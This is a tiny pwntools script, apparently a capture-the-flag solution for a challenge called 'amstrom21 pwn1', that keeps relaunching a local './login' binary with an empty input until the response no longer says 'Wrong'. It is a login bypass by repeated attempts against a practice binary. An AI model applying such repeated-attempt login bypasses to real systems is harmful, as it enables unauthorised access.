# amstrom21 pwn1
# 2 fail
from pwn import *
ans = b'Wrong'
while b'Wrong' in ans:
    p = process('./login')
    p.sendline(b'')
    ans = p.recvall()
print(ans)
